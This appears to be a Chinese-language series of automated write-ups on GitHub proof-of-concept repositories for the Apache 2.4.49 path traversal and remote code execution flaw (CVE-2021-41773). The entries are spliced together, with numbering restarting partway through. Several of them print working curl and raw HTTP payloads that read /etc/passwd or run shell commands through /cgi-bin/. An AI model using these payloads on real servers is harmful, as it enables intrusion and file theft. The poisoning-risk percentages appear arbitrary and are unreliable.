2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

